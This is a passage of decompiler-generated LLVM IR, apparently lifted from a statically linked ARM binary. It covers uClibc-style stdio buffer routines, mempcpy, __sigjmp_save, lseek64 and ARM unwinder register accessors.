  %v3_19034 = phi i32 [ %v3_19034.pre, %dec_label_pc_190dcthread-pre-split.dec_label_pc_19034_crit_edge ], [ 2147483647, %entry ]
  %v0_19038.in = phi i32 [ %v5_19050, %dec_label_pc_190dcthread-pre-split.dec_label_pc_19034_crit_edge ], [ %arg3, %entry ]
  %v3_19038 = phi i32 [ %v5_19050, %dec_label_pc_190dcthread-pre-split.dec_label_pc_19034_crit_edge ], [ %arg3, %entry ]
  %v0_19038 = icmp slt i32 %v0_19038.in, 0
  %storemerge = select i1 %v0_19038, i32 %v3_19034, i32 %v3_19038
  store i32 %storemerge, i32* @r2, align 4
  store i32 %v0_1903c, i32* %r1.global-to-local, align 4
  %v1_19040 = add i32 %v0_19040, 4
  %v2_19040 = inttoptr i32 %v1_19040 to i32*
  %v3_19040 = load i32, i32* %v2_19040, align 4
  %v3_19044 = call i32 @__GI___libc_write(i32 %v3_19040, i32 %v0_1903c)
  %v1_19048 = icmp slt i32 %v3_19044, 0
  %v2_19048 = icmp eq i32 %v3_19044, 0
  store i1 %v2_19048, i1* %cpsr_z.global-to-local, align 1
  br i1 %v1_19048, label %dec_label_pc_19058, label %dec_label_pc_190dcthread-pre-split

dec_label_pc_19058:                               ; preds = %dec_label_pc_19034
  %v0_19058 = load i32, i32* @r4, align 4
  %v1_19058 = inttoptr i32 %v0_19058 to i16*
  %v2_19058 = load i16, i16* %v1_19058, align 2
  %v1_1905c = or i16 %v2_19058, 8
  store i16 %v1_1905c, i16* %v1_19058, align 2
  store i32 40948, i32* %r3.global-to-local, align 4
  %v0_19068 = call i32 @__aeabi_read_tp()
  %v3_1906c = load i16, i16* @global_var_23068.363, align 2
  %v4_1906c = sext i16 %v3_1906c to i32
  store i32 %v4_1906c, i32* %r3.global-to-local, align 4
  %v2_19070 = add i32 %v4_1906c, %v0_19068
  %v3_19070 = inttoptr i32 %v2_19070 to i32*
  %v4_19070 = load i32, i32* %v3_19070, align 4
  store i32 %v4_19070, i32* %r3.global-to-local, align 4
  %v7_19074 = icmp eq i32 %v4_19070, 4
  store i1 %v7_19074, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_19074, label %dec_label_pc_19080, label %bb21

bb21:                                             ; preds = %dec_label_pc_19058
  %v8_19078 = icmp eq i32 %v4_19070, 11
  store i1 %v8_19078, i1* %cpsr_z.global-to-local, align 1
  br i1 %v8_19078, label %dec_label_pc_19080, label %dec_label_pc_190e4

dec_label_pc_19080:                               ; preds = %dec_label_pc_19058, %bb21
  %v0_19080 = load i32, i32* @r4, align 4
  %v1_19080 = add i32 %v0_19080, 8
  store i32 %v1_19080, i32* %r2.global-to-local, align 4
  %v1_19084 = inttoptr i32 %v1_19080 to i32*
  %v2_19084 = load i32, i32* %v1_19084, align 4
  store i32 %v2_19084, i32* %r2.global-to-local, align 4
  %v3_19084 = add i32 %v0_19080, 12
  %v4_19084 = inttoptr i32 %v3_19084 to i32*
  %v5_19084 = load i32, i32* %v4_19084, align 4
  store i32 %v5_19084, i32* %r3.global-to-local, align 4
  %v2_19088 = sub i32 %v5_19084, %v2_19084
  store i32 %v2_19088, i32* %r1.global-to-local, align 4
  %v9_19088 = icmp eq i32 %v5_19084, %v2_19084
  store i1 %v9_19088, i1* %cpsr_z.global-to-local, align 1
  %v0_190d4.pre = load i32, i32* @r5, align 4
  br i1 %v9_19088, label %dec_label_pc_190d4, label %dec_label_pc_19090

dec_label_pc_19090:                               ; preds = %dec_label_pc_19080
  %v3_19090 = icmp ult i32 %v2_19088, %v0_190d4.pre
  %v9_19090 = icmp eq i32 %v2_19088, %v0_190d4.pre
  store i1 %v9_19090, i1* %cpsr_z.global-to-local, align 1
  br i1 %v3_19090, label %.preheader, label %bb22

bb22:                                             ; preds = %dec_label_pc_19090
  store i32 %v0_190d4.pre, i32* %r1.global-to-local, align 4
  br label %.preheader

.preheader:                                       ; preds = %dec_label_pc_19090, %bb22, %dec_label_pc_190b8
  %v2_190a4 = phi i32 [ %v1_190bc, %dec_label_pc_190b8 ], [ %v2_19084, %bb22 ], [ %v2_19084, %dec_label_pc_19090 ]
  %v0_19098 = load i32, i32* @r6, align 4
  %v1_19098 = inttoptr i32 %v0_19098 to i8*
  %v2_19098 = load i8, i8* %v1_19098, align 1
  %v3_19098 = zext i8 %v2_19098 to i32
  store i32 %v3_19098, i32* %r3.global-to-local, align 4
  %v7_1909c = icmp eq i8 %v2_19098, 10
  store i1 %v7_1909c, i1* %cpsr_z.global-to-local, align 1
  %v1_190a0 = add i32 %v0_19098, 1
  store i32 %v1_190a0, i32* @r6, align 4
  %v3_190a4 = inttoptr i32 %v2_190a4 to i8*
  store i8 %v2_19098, i8* %v3_190a4, align 1
  %v0_190a8 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_190a8, label %dec_label_pc_190ac, label %dec_label_pc_190b8

dec_label_pc_190ac:                               ; preds = %.preheader
  %v0_190ac = load i32, i32* @r4, align 4
  %v1_190ac = inttoptr i32 %v0_190ac to i16*
  %v2_190ac = load i16, i16* %v1_190ac, align 2
  %v3_190ac = zext i16 %v2_190ac to i32
  store i32 %v3_190ac, i32* %r3.global-to-local, align 4
  %v1_190b0 = and i32 %v3_190ac, 256
  %v2_190b0 = icmp eq i32 %v1_190b0, 0
  store i1 %v2_190b0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_190b0, label %dec_label_pc_190b8, label %dec_label_pc_190ac.dec_label_pc_190c4_crit_edge

dec_label_pc_190ac.dec_label_pc_190c4_crit_edge:  ; preds = %dec_label_pc_190ac
  %v0_190c8.pre = load i32, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_190c4

dec_label_pc_190b8:                               ; preds = %dec_label_pc_190ac, %.preheader
  %v0_190b8 = load i32, i32* %r1.global-to-local, align 4
  %v1_190b8 = add i32 %v0_190b8, -1
  store i32 %v1_190b8, i32* %r1.global-to-local, align 4
  %v7_190b8 = icmp eq i32 %v0_190b8, 1
  store i1 %v7_190b8, i1* %cpsr_z.global-to-local, align 1
  %v0_190bc = load i32, i32* %r2.global-to-local, align 4
  %v1_190bc = add i32 %v0_190bc, 1
  store i32 %v1_190bc, i32* %r2.global-to-local, align 4
  br i1 %v7_190b8, label %dec_label_pc_190b8.dec_label_pc_190c4_crit_edge, label %.preheader

dec_label_pc_190b8.dec_label_pc_190c4_crit_edge:  ; preds = %dec_label_pc_190b8
  %v0_190c4.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_190c4

dec_label_pc_190c4:                               ; preds = %dec_label_pc_190ac.dec_label_pc_190c4_crit_edge, %dec_label_pc_190b8.dec_label_pc_190c4_crit_edge
  %v0_190c8 = phi i32 [ %v1_190bc, %dec_label_pc_190b8.dec_label_pc_190c4_crit_edge ], [ %v0_190c8.pre, %dec_label_pc_190ac.dec_label_pc_190c4_crit_edge ]
  %v0_190c4 = phi i32 [ %v0_190c4.pre, %dec_label_pc_190b8.dec_label_pc_190c4_crit_edge ], [ %v0_190ac, %dec_label_pc_190ac.dec_label_pc_190c4_crit_edge ]
  %v1_190c4 = add i32 %v0_190c4, 8
  %v2_190c4 = inttoptr i32 %v1_190c4 to i32*
  %v3_190c4 = load i32, i32* %v2_190c4, align 4
  store i32 %v3_190c4, i32* %r3.global-to-local, align 4
  %v2_190c8 = add i32 %v0_190c4, 16
  %v3_190c8 = inttoptr i32 %v2_190c8 to i32*
  store i32 %v0_190c8, i32* %v3_190c8, align 4
  %v0_190cc = load i32, i32* %r3.global-to-local, align 4
  %v1_190cc = load i32, i32* %r2.global-to-local, align 4
  %v2_190cc = sub i32 %v1_190cc, %v0_190cc
  store i32 %v2_190cc, i32* %r3.global-to-local, align 4
  %v1_190d0 = load i32, i32* @r5, align 4
  %v2_190d0 = sub i32 %v1_190d0, %v2_190cc
  br label %dec_label_pc_190d4

dec_label_pc_190d4:                               ; preds = %dec_label_pc_19080, %dec_label_pc_190c4
  %v0_190d4 = phi i32 [ %v2_190d0, %dec_label_pc_190c4 ], [ %v0_190d4.pre, %dec_label_pc_19080 ]
  %v1_190d4 = load i32, i32* @r7, align 4
  %v2_190d4 = sub i32 %v1_190d4, %v0_190d4
  store i32 %v2_190d4, i32* @r7, align 4
  br label %dec_label_pc_190e4

dec_label_pc_190dcthread-pre-split:               ; preds = %dec_label_pc_19034
  %v3_1904c = load i32, i32* @r6, align 4
  %v5_1904c = add i32 %v3_1904c, %v3_19044
  store i32 %v5_1904c, i32* @r6, align 4
  %v4_19050 = load i32, i32* @r5, align 4
  %v5_19050 = sub i32 %v4_19050, %v3_19044
  store i32 %v5_19050, i32* @r5, align 4
  %v2_190dc = icmp eq i32 %v5_19050, 0
  store i1 %v2_190dc, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_190dc, label %dec_label_pc_190e4, label %dec_label_pc_190dcthread-pre-split.dec_label_pc_19034_crit_edge

dec_label_pc_190dcthread-pre-split.dec_label_pc_19034_crit_edge: ; preds = %dec_label_pc_190dcthread-pre-split
  %v3_19034.pre = load i32, i32* @r8, align 4
  %v0_19040.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_19034

dec_label_pc_190e4:                               ; preds = %dec_label_pc_190dcthread-pre-split, %entry, %bb21, %dec_label_pc_190d4
  %v0_190e4 = load i32, i32* @r7, align 4
  ret i32 %v0_190e4

; uselistorder directives
  uselistorder i32 %v5_19050, { 1, 3, 0, 2 }
  uselistorder i32 %v5_1904c, { 1, 0 }
  uselistorder i32 %v0_190c4, { 1, 0 }
  uselistorder i32 %v1_190bc, { 0, 2, 1 }
  uselistorder i32 %v0_190b8, { 1, 0 }
  uselistorder i32 %v0_190d4.pre, { 0, 3, 1, 2 }
  uselistorder i32 %v5_19084, { 1, 0, 2 }
  uselistorder i32 %v2_19084, { 0, 1, 3, 2, 4 }
  uselistorder i32 %v3_19044, { 1, 0, 2, 3 }
  uselistorder i32 %v0_1903c, { 1, 0 }
  uselistorder i32* %r2.global-to-local, { 3, 1, 4, 2, 5, 6, 0 }
  uselistorder i32* %r1.global-to-local, { 1, 3, 2, 4, 5, 0 }
  uselistorder i1* %cpsr_z.global-to-local, { 9, 0, 1, 2, 3, 4, 5, 6, 7, 8, 10 }
  uselistorder i8 10, { 2, 3, 0, 1 }
  uselistorder i32 11, { 9, 5, 6, 7, 17, 24, 25, 10, 11, 12, 8, 13, 2, 14, 15, 16, 18, 19, 3, 20, 4, 21, 0, 22, 1, 23, 26 }
  uselistorder i32 (i32, i32)* @__GI___libc_write, { 2, 1, 0 }
  uselistorder i32 2147483647, { 1, 6, 7, 0, 2, 3, 4, 5 }
  uselistorder i32 %arg3, { 1, 0, 2, 3, 4, 5 }
  uselistorder label %dec_label_pc_190e4, { 0, 3, 2, 1 }
  uselistorder label %dec_label_pc_190d4, { 1, 0 }
  uselistorder label %dec_label_pc_190c4, { 1, 0 }
  uselistorder label %.preheader, { 2, 1, 0 }
  uselistorder label %dec_label_pc_19080, { 1, 0 }
  uselistorder label %dec_label_pc_19034, { 1, 0 }
}

define i32 @__stdio_rfill(i32 %arg1) local_unnamed_addr {
entry:
  %r2.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_190f4 = load i32, i32* @r4, align 4
  store i32 %v3_190f4, i32* %stack_var_-8, align 4
  %v1_190f8 = add i32 %arg1, 8
  %v1_190fc = inttoptr i32 %v1_190f8 to i32*
  %v2_190fc = load i32, i32* %v1_190fc, align 4
  store i32 %v2_190fc, i32* @r1, align 4
  %v3_190fc = add i32 %arg1, 12
  %v4_190fc = inttoptr i32 %v3_190fc to i32*
  %v5_190fc = load i32, i32* %v4_190fc, align 4
  %v2_19100 = sub i32 %v5_190fc, %v2_190fc
  store i32 %v2_19100, i32* %r2.global-to-local, align 4
  store i32 %arg1, i32* @r4, align 4
  %v3_19108 = inttoptr i32 %arg1 to i16*
  %v4_19108 = call i32 @__stdio_READ(i16* %v3_19108, i32 %v2_190fc, i32 %v2_19100)
  %v0_1910c = load i32, i32* @r4, align 4
  %v1_1910c = add i32 %v0_1910c, 8
  %v2_1910c = inttoptr i32 %v1_1910c to i32*
  %v3_1910c = load i32, i32* %v2_1910c, align 4
  store i32 %v3_1910c, i32* %r2.global-to-local, align 4
  %v2_19110 = add i32 %v3_1910c, %v4_19108
  %v2_19114 = add i32 %v0_1910c, 20
  %v3_19114 = inttoptr i32 %v2_19114 to i32*
  store i32 %v2_19110, i32* %v3_19114, align 4
  %v0_19118 = load i32, i32* %r2.global-to-local, align 4
  %v1_19118 = load i32, i32* @r4, align 4
  %v2_19118 = add i32 %v1_19118, 16
  %v3_19118 = inttoptr i32 %v2_19118 to i32*
  store i32 %v0_19118, i32* %v3_19118, align 4
  %v2_1911c = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_1911c, i32* @r4, align 4
  ret i32 %v4_19108

; uselistorder directives
  uselistorder i32 %v4_19108, { 1, 0 }
  uselistorder i32 %arg1, { 3, 2, 1, 0 }
}

define i32 @__stdio_trans2r_o() local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %v3_19124 = load i32, i32* @r4, align 4
  store i32 %v3_19124, i32* %stack_var_-12, align 4
  %v0_19128 = load i32, i32* @r0, align 4
  %v1_19128 = inttoptr i32 %v0_19128 to i16*
  %v2_19128 = load i16, i16* %v1_19128, align 2
  %v3_19128 = zext i16 %v2_19128 to i32
  store i32 %v3_19128, i32* %r3.global-to-local, align 4
  %v0_1912c = load i32, i32* @r1, align 4
  %v2_1912c = and i32 %v0_1912c, %v3_19128
  %v4_1912c = icmp eq i32 %v2_1912c, 0
  store i32 %v0_19128, i32* @r4, align 4
  br i1 %v4_1912c, label %dec_label_pc_1913c, label %dec_label_pc_1914c

dec_label_pc_1913c:                               ; preds = %entry
  %v1_1913c = and i32 %v3_19128, 2176
  %v2_1913c = icmp eq i32 %v1_1913c, 0
  br i1 %v2_1913c, label %dec_label_pc_19144, label %dec_label_pc_19158

dec_label_pc_19144:                               ; preds = %dec_label_pc_1913c
  %v2_19144 = or i32 %v0_1912c, %v3_19128
  store i32 %v2_19144, i32* %r3.global-to-local, align 4
  %v1_19148 = trunc i32 %v2_19144 to i16
  store i16 %v1_19148, i16* %v1_19128, align 2
  %v0_1914c.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_1914c

dec_label_pc_1914c:                               ; preds = %entry, %dec_label_pc_19144
  %v0_1914c = phi i32 [ %v0_19128, %entry ], [ %v0_1914c.pre, %dec_label_pc_19144 ]
  %v1_1914c = inttoptr i32 %v0_1914c to i16*
  %v2_1914c = load i16, i16* %v1_1914c, align 2
  %v3_1914c = zext i16 %v2_1914c to i32
  store i32 %v3_1914c, i32* %r3.global-to-local, align 4
  %v1_19150 = and i32 %v3_1914c, 16
  store i32 %v1_19150, i32* %r5.global-to-local, align 4
  %v2_19150 = icmp eq i32 %v1_19150, 0
  br i1 %v2_19150, label %dec_label_pc_19180, label %dec_label_pc_19158

dec_label_pc_19158:                               ; preds = %dec_label_pc_1913c, %dec_label_pc_1914c
  store i32 ptrtoint ([3 x i8]* @global_var_9f00.698 to i32), i32* %r3.global-to-local, align 4
  %v0_1915c = call i32 @__aeabi_read_tp()
  store i32 %v0_1915c, i32* %r0.global-to-local, align 4
  %v3_19160 = load i16, i16* @global_var_23068.363, align 2
  %v4_19160 = sext i16 %v3_19160 to i32
  store i32 %v4_19160, i32* %r3.global-to-local, align 4
  %v3_19168 = add i32 %v4_19160, %v0_1915c
  %v4_19168 = inttoptr i32 %v3_19168 to i32*
  store i32 9, i32* %v4_19168, align 4
  br label %dec_label_pc_1916c

dec_label_pc_1916c:                               ; preds = %dec_label_pc_19188, %dec_label_pc_19158
  %v0_1916c = load i32, i32* @r4, align 4
  %v1_1916c = inttoptr i32 %v0_1916c to i16*
  %v2_1916c = load i16, i16* %v1_1916c, align 2
  %v3_1916c = zext i16 %v2_1916c to i32
  store i32 -1, i32* %r0.global-to-local, align 4
  %v1_19174 = or i32 %v3_1916c, 8
  store i32 %v1_19174, i32* %r3.global-to-local, align 4
  %v1_19178 = trunc i32 %v1_19174 to i16
  store i16 %v1_19178, i16* %v1_1916c, align 2
  %v1_191c0.pre = load i32, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_191b8

dec_label_pc_19180:                               ; preds = %dec_label_pc_1914c
  %v1_19180 = and i32 %v3_1914c, 64
  %v2_19180 = icmp eq i32 %v1_19180, 0
  br i1 %v2_19180, label %dec_label_pc_191a8, label %dec_label_pc_19188

dec_label_pc_19188:                               ; preds = %dec_label_pc_19180
  %v0_19188 = load i32, i32* @r0, align 4
  %v1_19188 = call i32 @__stdio_wcommit(i32 %v0_19188)
  store i32 %v1_19188, i32* %r0.global-to-local, align 4
  %v2_1918c = icmp eq i32 %v1_19188, 0
  br i1 %v2_1918c, label %dec_label_pc_19194, label %dec_label_pc_1916c

dec_label_pc_19194:                               ; preds = %dec_label_pc_19188
  %v0_19194 = load i32, i32* @r4, align 4
  %v1_19194 = inttoptr i32 %v0_19194 to i16*
  %v2_19194 = load i16, i16* %v1_19194, align 2
  %v3_19194 = zext i16 %v2_19194 to i32
  store i32 %v3_19194, i32* %r3.global-to-local, align 4
  %v1_19198 = add i32 %v0_19194, 8
  %v2_19198 = inttoptr i32 %v1_19198 to i32*
  %v3_19198 = load i32, i32* %v2_19198, align 4
  %v1_1919c = and i32 %v3_19194, 65471
  store i32 %v1_1919c, i32* %r3.global-to-local, align 4
  %v2_191a0 = add i32 %v0_19194, 28
  %v3_191a0 = inttoptr i32 %v2_191a0 to i32*
  store i32 %v3_19198, i32* %v3_191a0, align 4
  %v0_191a4 = load i32, i32* %r3.global-to-local, align 4
  %v1_191a4 = trunc i32 %v0_191a4 to i16
  %v2_191a4 = load i32, i32* @r4, align 4
  %v3_191a4 = inttoptr i32 %v2_191a4 to i16*
  store i16 %v1_191a4, i16* %v3_191a4, align 2
  %v0_191a8.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_191a8

dec_label_pc_191a8:                               ; preds = %dec_label_pc_19180, %dec_label_pc_19194
  %v2_191b0 = phi i32 [ %v0_1914c, %dec_label_pc_19180 ], [ %v0_191a8.pre, %dec_label_pc_19194 ]
  %v1_191a8 = inttoptr i32 %v2_191b0 to i16*
  %v2_191a8 = load i16, i16* %v1_191a8, align 2
  %v3_191a8 = zext i16 %v2_191a8 to i32
  %v1_191ac = or i32 %v3_191a8, 1
  store i32 %v1_191ac, i32* %r3.global-to-local, align 4
  %v1_191b0 = trunc i32 %v1_191ac to i16
  store i16 %v1_191b0, i16* %v1_191a8, align 2
  %v0_191b4 = load i32, i32* %r5.global-to-local, align 4
  store i32 %v0_191b4, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_191b8

dec_label_pc_191b8:                               ; preds = %dec_label_pc_1916c, %dec_label_pc_191a8
  %v1_191c0 = phi i32 [ %v1_191c0.pre, %dec_label_pc_1916c ], [ %v0_191b4, %dec_label_pc_191a8 ]
  %v2_191bc = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_191bc, i32* @r4, align 4
  ret i32 %v1_191c0

; uselistorder directives
  uselistorder i32 %v3_19128, { 0, 2, 1, 3 }
  uselistorder i32* %r0.global-to-local, { 0, 3, 1, 2, 4 }
  uselistorder i32 65471, { 2, 1, 0 }
  uselistorder i32 (i32)* @__stdio_wcommit, { 2, 1, 0 }
  uselistorder label %dec_label_pc_191b8, { 1, 0 }
  uselistorder label %dec_label_pc_191a8, { 1, 0 }
  uselistorder label %dec_label_pc_19158, { 1, 0 }
  uselistorder label %dec_label_pc_1914c, { 1, 0 }
}

define i32 @__GI_mempcpy(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  store i32 %arg2, i32* @r2, align 4
  store i32 %arg1, i32* @r0, align 4
  %v3_191c8 = load i32, i32* @r4, align 4
  %v6_191c8 = load i32, i32* @r5, align 4
  store i32 %arg1, i32* @r5, align 4
  store i32 %arg2, i32* @r4, align 4
  %v0_191d8 = call i32 @memcpy()
  %v0_191dc = load i32, i32* @r5, align 4
  %v1_191dc = load i32, i32* @r4, align 4
  %v2_191dc = add i32 %v1_191dc, %v0_191dc
  store i32 %v3_191c8, i32* @r4, align 4
  store i32 %v6_191c8, i32* @r5, align 4
  ret i32 %v2_191dc
}

define i32 @__sigjmp_save() local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v0_191ec = load i32, i32* @r1, align 4
  %v2_191ec = icmp eq i32 %v0_191ec, 0
  %v3_191f0 = load i32, i32* @r4, align 4
  store i32 %v3_191f0, i32* %stack_var_-8, align 4
  %v0_191f4 = load i32, i32* @r0, align 4
  store i32 %v0_191f4, i32* %r4.global-to-local, align 4
  br i1 %v2_191ec, label %dec_label_pc_19218, label %dec_label_pc_191fc

dec_label_pc_191fc:                               ; preds = %entry
  %v1_19204 = add i32 %v0_191f4, 260
  %v4_19208 = call i32 @__GI_sigprocmask(i32 0, i32* null, i32 %v1_19204)
  %v2_1920c = icmp eq i32 %v4_19208, 0
  br i1 %v2_1920c, label %dec_label_pc_1921c, label %dec_label_pc_19218

dec_label_pc_19218:                               ; preds = %dec_label_pc_191fc, %entry
  br label %dec_label_pc_1921c

dec_label_pc_1921c:                               ; preds = %dec_label_pc_191fc, %dec_label_pc_19218
  %storemerge = phi i32 [ 0, %dec_label_pc_19218 ], [ 1, %dec_label_pc_191fc ]
  %v1_19220 = load i32, i32* %r4.global-to-local, align 4
  %v2_19220 = add i32 %v1_19220, 256
  %v3_19220 = inttoptr i32 %v2_19220 to i32*
  store i32 %storemerge, i32* %v3_19220, align 4
  %v2_19224 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_19224, i32* %r4.global-to-local, align 4
  ret i32 0

; uselistorder directives
  uselistorder i32 (i32, i32*, i32)* @__GI_sigprocmask, { 1, 2, 0 }
  uselistorder i32* null, { 9, 0, 5, 6, 1, 7, 8, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 2, 20, 3, 21, 4, 22, 23, 24 }
  uselistorder label %dec_label_pc_1921c, { 1, 0 }
}

define i32 @__GI_lseek64(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %tmp = call i32 @__decompiler_undefined_function_0()
  %tmp8 = call i32 @__decompiler_undefined_function_0()
  store i32 %arg2, i32* %r1.global-to-local, align 4
  store i32 %arg1, i32* %r2.global-to-local, align 4
  %tmp10 = icmp ult i32 %arg1, -4095
  br i1 %tmp10, label %dec_label_pc_19274, label %dec_label_pc_19258

dec_label_pc_19258:                               ; preds = %entry
  %v0_1925c = call i32 @__aeabi_read_tp()
  %v3_19260 = load i16, i16* @global_var_23068.363, align 2
  %v4_19260 = sext i16 %v3_19260 to i32
  %v0_19264 = load i32, i32* %r2.global-to-local, align 4
  %v1_19264 = sub i32 0, %v0_19264
  store i32 %v1_19264, i32* %r2.global-to-local, align 4
  store i32 -1, i32* %r1.global-to-local, align 4
  %v3_1926c = add i32 %v4_19260, %v0_1925c
  %v4_1926c = inttoptr i32 %v3_1926c to i32*
  store i32 %v1_19264, i32* %v4_1926c, align 4
  %v0_1927c.pre = load i32, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_1927c

dec_label_pc_19274:                               ; preds = %entry
  store i32 %arg1, i32* %r1.global-to-local, align 4
  %v2_19274 = icmp eq i32 %arg1, 0
  br i1 %v2_19274, label %dec_label_pc_19288, label %dec_label_pc_1927c

dec_label_pc_1927c:                               ; preds = %dec_label_pc_19274, %dec_label_pc_19258
  %v0_1927c = phi i32 [ %arg1, %dec_label_pc_19274 ], [ %v0_1927c.pre, %dec_label_pc_19258 ]
  %v3_19280 = ashr i32 %v0_1927c, 31
  br label %dec_label_pc_1928c

dec_label_pc_19288:                               ; preds = %dec_label_pc_19274
  br label %dec_label_pc_1928c

dec_label_pc_1928c:                               ; preds = %dec_label_pc_1927c, %dec_label_pc_19288
  %v1_19294 = phi i32 [ %v0_1927c, %dec_label_pc_1927c ], [ %tmp8, %dec_label_pc_19288 ]
  %storemerge = phi i32 [ %v3_19280, %dec_label_pc_1927c ], [ %tmp, %dec_label_pc_19288 ]
  store i32 %storemerge, i32* %r1.global-to-local, align 4
  ret i32 %v1_19294

; uselistorder directives
  uselistorder i32* %r1.global-to-local, { 3, 0, 1, 2, 4 }
  uselistorder i32 31, { 4, 1, 2, 5, 6, 7, 8, 3, 0 }
  uselistorder i16 8, { 3, 0, 1, 2, 4 }
  uselistorder i16* @global_var_23068.363, { 63, 62, 61, 60, 59, 58, 57, 56, 55, 54, 53, 52, 51, 50, 49, 48, 47, 46, 45, 44, 43, 42, 41, 40, 39, 38, 37, 36, 35, 34, 33, 32, 31, 30, 29, 28, 27, 26, 25, 24, 23, 22, 21, 20, 19, 18, 17, 16, 15, 14, 13, 12, 11, 10, 9, 8, 7, 6, 5, 4, 3, 2, 1, 0 }
  uselistorder i32 ()* @__aeabi_read_tp, { 64, 70, 69, 63, 62, 79, 78, 67, 68, 66, 65, 77, 76, 75, 74, 73, 72, 71, 17, 25, 27, 34, 61, 43, 42, 12, 6, 5, 11, 24, 23, 10, 3, 2, 13, 9, 8, 7, 48, 16, 22, 47, 46, 26, 19, 21, 20, 58, 57, 14, 32, 31, 30, 33, 56, 45, 55, 54, 29, 28, 18, 60, 59, 41, 38, 37, 36, 44, 4, 53, 52, 35, 51, 15, 50, 49, 0, 1, 40, 39 }
  uselistorder i32 -4095, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 35, 34, 36, 37, 38 }
  uselistorder i32 %arg1, { 1, 2, 3, 0, 4 }
  uselistorder label %dec_label_pc_1928c, { 1, 0 }
}

define i32 @_Unwind_VRS_Get(i32 %context, i32 %regclass, i32 %regno, i32 %representation, i8* %valuep) local_unnamed_addr {
entry:
  %v2_1929c = icmp eq i32 %regclass, 0
  br i1 %v2_1929c, label %dec_label_pc_192a4, label %dec_label_pc_192d4

dec_label_pc_192a4:                               ; preds = %entry
  %tmp = icmp ult i32 %regno, 16
  br i1 %tmp, label %bb, label %.thread3

bb:                                               ; preds = %dec_label_pc_192a4
  %v6_192a8 = icmp eq i32 %representation, 0
  br i1 %v6_192a8, label %dec_label_pc_192b8, label %bb8

.thread3:                                         ; preds = %dec_label_pc_192a4
  br label %dec_label_pc_192e0

bb8:                                              ; preds = %bb
  br label %dec_label_pc_192e0

dec_label_pc_192b8:                               ; preds = %bb
  %v3_192b8 = mul i32 %regno, 4
  %v2_192bc = add i32 %v3_192b8, %context
  %v1_192c0 = add i32 %v2_192bc, 4
  %v2_192c0 = inttoptr i32 %v1_192c0 to i32*
  %v3_192c0 = load i32, i32* %v2_192c0, align 4
  %v2_192cc = bitcast i8* %valuep to i32*
  store i32 %v3_192c0, i32* %v2_192cc, align 4
  ret i32 0

dec_label_pc_192d4:                               ; preds = %entry
  %tmp11 = icmp ult i32 %regclass, 5
  br i1 %tmp11, label %bb9, label %bb10

bb9:                                              ; preds = %dec_label_pc_192d4
  br label %bb10

bb10:                                             ; preds = %dec_label_pc_192d4, %bb9
  %v0_192dc = load i32, i32* @lr, align 4
  call void @__pseudo_cond_branch(i1 %tmp11, i32 %v0_192dc)
  br label %dec_label_pc_192e0

dec_label_pc_192e0:                               ; preds = %bb8, %.thread3, %bb10
  ret i32 2

; uselistorder directives
  uselistorder i32 %regno, { 1, 0 }
  uselistorder label %dec_label_pc_192e0, { 2, 0, 1 }
  uselistorder label %bb10, { 1, 0 }
}

define i32 @_Unwind_VRS_Set(i32 %context, i32 %regclass, i32 %regno, i32 %representation, i8* %valuep) local_unnamed_addr {
entry:
  %v2_192e8 = icmp eq i32 %regclass, 0
  br i1 %v2_192e8, label %dec_label_pc_192f0, label %dec_label_pc_19320

dec_label_pc_192f0:                               ; preds = %entry
  %tmp = icmp ult i32 %regno, 16
  br i1 %tmp, label %bb, label %.thread3

bb:                                               ; preds = %dec_label_pc_192f0
  %v6_192f4 = icmp eq i32 %representation, 0
  br i1 %v6_192f4, label %dec_label_pc_19304, label %bb8

.thread3:                                         ; preds = %dec_label_pc_192f0
  br label %dec_label_pc_1932c

bb8:                                              ; preds = %bb
  br label %dec_label_pc_1932c

dec_label_pc_19304:                               ; preds = %bb
  %v3_19308 = mul i32 %regno, 4
  %v1_1930c = bitcast i8* %valuep to i32*
  %v2_1930c = load i32, i32* %v1_1930c, align 4
  %v2_19310 = add i32 %v3_19308, %context
  %v2_19318 = add i32 %v2_19310, 4
  %v3_19318 = inttoptr i32 %v2_19318 to i32*
  store i32 %v2_1930c, i32* %v3_19318, align 4
  ret i32 0

dec_label_pc_19320:                               ; preds = %entry
  %tmp11 = icmp ult i32 %regclass, 5
  br i1 %tmp11, label %bb9, label %bb10

bb9:                                              ; preds = %dec_label_pc_19320
  br label %bb10

bb10:                                             ; preds = %dec_label_pc_19320, %bb9
  %v0_19328 = load i32, i32* @lr, align 4
  call void @__pseudo_cond_branch(i1 %tmp11, i32 %v0_19328)
  br label %dec_label_pc_1932c

dec_label_pc_1932c:                               ; preds = %bb8, %.thread3, %bb10
  ret i32 2

; uselistorder directives
  uselistorder i32 %regno, { 1, 0 }
  uselistorder label %dec_label_pc_1932c, { 2, 0, 1 }
  uselistorder label %bb10, { 1, 0 }
}

define i32 @_Unwind_GetCFA(i32 %context) local_unnamed_addr {
entry:
